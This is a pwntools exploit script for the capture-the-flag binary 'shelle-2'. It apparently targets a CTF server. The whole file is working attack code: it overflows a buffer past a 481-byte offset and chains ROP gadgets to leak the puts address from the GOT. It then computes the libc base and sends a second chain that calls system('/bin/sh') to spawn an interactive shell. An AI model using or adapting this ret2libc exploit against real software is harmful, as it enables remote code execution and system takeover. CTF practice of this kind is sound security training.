#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template shelle-2
from pwn import *

exe = context.binary = ELF('shelle-2')

if not args.REMOTE:
    libc = exe.libc
else:
    libc = ELF("libc6_2.31-0ubuntu9_amd64.so") 

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('challenge.ctf.games', 30731)
        #return remote('localhost', 9999)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

offset = 481

pop_rdi = 0x00000000004015f3
pop_rsi_r15 = 0x00000000004015f1

pop_5 = 0x00000000004015eb
pop_4 = 0x00000000004015ec
pop_3 = 0x00000000004015ee
pop_2 = 0x00000000004015f0
pop_1 = 0x00000000004015f2
ret = 0x000000000040101a

puts = 0x00000000004010f0


payload = b'\\' * offset

payload += p64(pop_5)
payload += p64(5)
payload += p64(4)
payload += p64(3)
payload += p64(2)
payload += p64(1)

payload += p64(pop_4)
payload += p64(4)
payload += p64(3)
payload += p64(2)
payload += p64(1)

payload += p64(pop_3)
payload += p64(3)
payload += p64(2)
payload += p64(1)

# leak puts@got
payload += p64(pop_rdi)
payload += p64(exe.got.puts)
payload += p64(puts)

payload += p64(pop_3)
payload += p64(3)
payload += p64(2)
payload += p64(1)

payload += p64(exe.sym.run_cmds)

io.sendlineafter(b"Strict-psuedoshell$", payload)
io.sendlineafter(b"Strict-psuedoshell$", b"exit")

puts_address = u64(io.readline(False).ljust(8, b'\x00'))
log.info(f'puts@got: {puts_address:#x}')
libc.address = puts_address - libc.sym.puts

payload = b'\\' * offset

payload += p64(pop_2)
payload += p64(2)
payload += p64(1)

payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))

payload += p64(pop_2)
payload += p64(2)
payload += p64(1)

payload += p64(libc.sym.system)


io.sendlineafter(b"Strict-psuedoshell$", payload)
io.sendlineafter(b"Strict-psuedoshell$", b"exit")

io.interactive()
